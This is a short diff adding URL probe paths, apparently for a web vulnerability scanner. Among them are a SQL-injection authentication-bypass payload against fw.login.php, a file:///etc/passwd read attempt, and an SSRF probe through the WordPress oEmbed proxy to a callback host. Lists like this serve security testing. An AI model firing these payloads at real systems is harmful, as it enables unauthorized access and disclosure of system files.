@@ -1,0 +1,9 @@
+/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
+/index.php?q=file:///etc/passwd
+/fw.login.php
+/login
+/proxy
+/wpad.dat
+/inormalydonotexist
+/sap/wdisp/admin/public/default.html
+/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}/
